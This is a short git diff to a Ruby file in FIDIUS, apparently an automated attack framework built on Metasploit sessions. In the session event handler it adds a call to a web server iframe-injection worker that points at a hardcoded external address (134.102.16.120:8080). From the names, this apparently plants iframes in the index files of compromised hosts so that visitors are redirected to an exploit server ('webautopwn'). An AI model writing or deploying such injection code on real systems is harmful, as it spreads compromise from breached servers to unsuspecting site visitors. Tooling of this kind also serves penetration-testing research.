@@ -1,5 +1,6 @@
-module FIDIUS
+require "#{RAILS_ROOT}/script/worker/webServerIFrameInjection"
 
+module FIDIUS
 module Session
 
   class MsfSessionEvent
@@ -65,6 +66,10 @@ module Session
     begin
       session.load_stdapi
       add_route_to_session session
+      #TODO Reco
+      #FIXME: get the local address of the interface the webautopwn is running on.
+      webserver_iframe = FIDIUS::WebserverIFrameInjection.new session, "http://134.102.16.120:8080/"
+      webserver_iframe.localizeIndexFiles
 #      install_meterpreter session
     rescue ::Exception
       puts "problem in session_action: #{$!} #{$!.backtrace}"
